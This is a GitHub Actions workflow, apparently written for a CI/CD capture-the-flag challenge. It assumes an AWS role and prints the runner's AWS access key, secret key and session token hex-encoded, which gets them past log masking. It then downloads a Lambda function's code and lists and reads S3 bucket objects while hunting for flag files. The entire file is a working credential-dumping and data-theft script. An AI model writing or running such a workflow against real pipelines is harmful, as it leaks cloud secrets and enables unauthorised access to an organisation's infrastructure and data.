name: grab
on:
  workflow_dispatch:
  push:
permissions:
  id-token: write
  contents: read
jobs:
  dump:
    runs-on: self-hosted
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
      - run: |
          set +e
          aws sts get-caller-identity | tee /tmp/id.json
          python3 -c "import os
for k in ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN']:
 print(k+'_HEX='+os.environ.get(k,'').encode().hex())" | tee /tmp/creds.hex
          URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text)
          echo URL=$URL | tee /tmp/url.txt
          curl -sL "$URL" -o /tmp/lam.zip
          python3 -c "import zipfile;z=zipfile.ZipFile('/tmp/lam.zip');
[print(n);print(z.read(n)) for n in z.namelist()]" | tee /tmp/lamcode.txt
          aws s3 ls s3://codec4f26c862a321ef5/ | tee /tmp/list.txt
          # platform objects with known names
          for k in flag.txt flags.json stage1/flag.txt $(aws s3api list-objects-v2 --bucket platform-bucket-009661764077-us-east-1 --query 'Contents[].Key' --output text 2>/dev/null); do
            echo TRY $k
            aws s3 cp "s3://platform-bucket-009661764077-us-east-1/$k" - 2>&1 | head -c 500
          done | tee /tmp/plat.txt